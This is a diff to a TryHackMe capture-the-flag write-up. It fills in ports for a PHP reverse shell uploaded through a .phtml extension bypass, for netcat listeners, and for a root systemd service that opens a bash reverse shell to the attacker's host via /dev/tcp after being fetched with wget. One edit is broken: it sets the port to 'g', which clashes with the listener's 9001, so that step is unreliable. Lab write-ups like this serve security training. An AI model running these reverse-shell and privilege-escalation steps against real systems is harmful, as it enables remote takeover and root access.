@@ -78,7 +78,7 @@ We discover that the extension `.phtml` is not blocked in the upload page. There
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '<ATTACK_IP>';    // CHANGE THIS
-$port = <ATTACK_PORT1>;           // CHANGE THIS
+$port = 9065;           // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -226,7 +226,7 @@ To gain remote access to this machine, follow these steps:
 
 - Edit the `php-reverse-shell.php` file and edit the IP to be your `tun0` IP (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
 - Rename this file to `php-reverse-shell.phtml`.
-- We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp <ATTACK_PORT1>`.
+- We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 9065`.
 - Upload your shell and navigate to http://<MACHINE_IP>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload!
   You should see a connection on your netcat session.
 
@@ -251,7 +251,7 @@ Description=root
 [Service]
 Type=simple
 User=root
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACK_IP/<ATTACK_PORT2> 0>&1'
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACK_IP/g 0>&1'
 
 [Install]
 WantedBy=multi-user.target
@@ -262,7 +262,7 @@ We serve this file with Python: `python -m http.server 8080` from the same direc
 We get `root.service` on the attacked machine: in `/var/www/html` (a directory where we can write files) we launch: `wget http://<ATTACK_IP>:8080/root.service`
 Then, we enable the service with `/bin/systemctl enable /var/www/html/root.service`.
 
-On the attacking machine, we start a listener on port `<ATTACK_PORT2>` with `nc -lvnp <ATTACK_PORT2>`.
+On the attacking machine, we start a listener on port `9001` with `nc -lvnp 9001`.
 
 Finally, on the attacked machine, we start the service with:
 ```
